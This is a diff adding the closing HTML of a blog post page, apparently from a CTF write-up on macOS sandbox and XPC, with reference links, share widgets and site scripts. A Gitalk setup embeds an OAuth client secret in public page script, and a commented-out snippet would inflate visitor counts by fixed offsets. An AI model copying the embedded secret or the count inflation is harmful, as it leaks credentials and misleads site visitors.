+<li><a href="https://ubrigens.com/posts/sandbox_coverage.html" target="_blank" rel="noopener">Exploring Sandbox Coverage on macOS - ubrigens</a></li>
+<li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1417" target="_blank" rel="noopener">Issue 1417: iOS/MacOS kernel double free due to IOSurfaceRootUserClient not respecting MIG ownership rules</a></li>
+</ul>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://kiprey.github.io/2022/01/35c3ctf_pillow/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ipc/" rel="tag">ipc</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/mac/" rel="tag">mac</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/mach/" rel="tag">mach</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sandbox/" rel="tag">sandbox</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xpc/" rel="tag">xpc</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2022/01/ubuntu_desktop_recover/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            Ubuntu 恢复图形界面记录
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2022/01/mach_xpc_intro/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">MacOSX XPC 入门</div>
+      </a>
+    
+  </nav>
+
+   
+ 
+   
+<div class="gitalk" id="gitalk-container"></div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
+
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script>
+
+<script type="text/javascript">
+  var gitalk = new Gitalk({
+    clientID: '5f6c407f4cb8963d03ac',
+    clientSecret: '1d6faa663a735dbfd671990187d6e62b32498560',
+    repo: 'kiprey.github.io',
+    owner: 'kiprey',
+    admin: ['kiprey'],
+    // id: location.pathname,      // Ensure uniqueness and length less than 50
+    id: md5(location.pathname),
+    distractionFreeMode: false,  // Facebook-like distraction free mode
+    pagerDirection: 'last'
+  })
+
+  gitalk.render('gitalk-container')
+</script>
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2020-2025
+        <i class="ri-heart-fill heart_icon"></i> Kiprey
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        <!-- <script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+        <script>
+            $(document).ready(function() {
+                var int1 = setInterval(fixCount1, 100);
+                var int2 = setInterval(fixCount2, 100);
+
+                var busuanziValueSiteOffset = 100000000000;
+                var busuanziValuePageOffset = 200000000000;
+                function fixCount1() {
+                    if ($("#busuanzi_value_site_uv").css("display") != "none") {
+                        clearInterval(int1);
+                        $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + busuanziValueSiteOffset);
+                    }
+                }
+                function fixCount2() {
+                    if ($("#busuanzi_value_page_pv").css("display") != "none") {
+                        clearInterval(int2);
+                        $("#busuanzi_value_page_pv").html(parseInt($("#busuanzi_value_page_pv").html()) + busuanziValuePageOffset);
+                    }
+                }
+            });
+        </script> -->
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="Kiprey&#39;s Blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+  var ayerConfig = {
+    mathjax: true
+  }
+</script>
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+
+<script src="/js/clickBoom2.js"></script>
+
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+<script src="/js/dz.js"></script>
+
+
+<!-- mermaid -->
+
+  <script src='https://cdn.bootcdn.net/ajax/libs/mermaid/8.5.2/mermaid.min.js'></script>
+  <script>
+    if (window.mermaid) {
+      mermaid.initialize({theme: 'forest'});
+    }
+  </script>
+
+<!-- baiduSpider auto push -->
+
+  <script>
+    (function(){
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https'){
+       bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else{
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+    </script>
+
+
+    
+  </div>
+</body>
+
+</html>
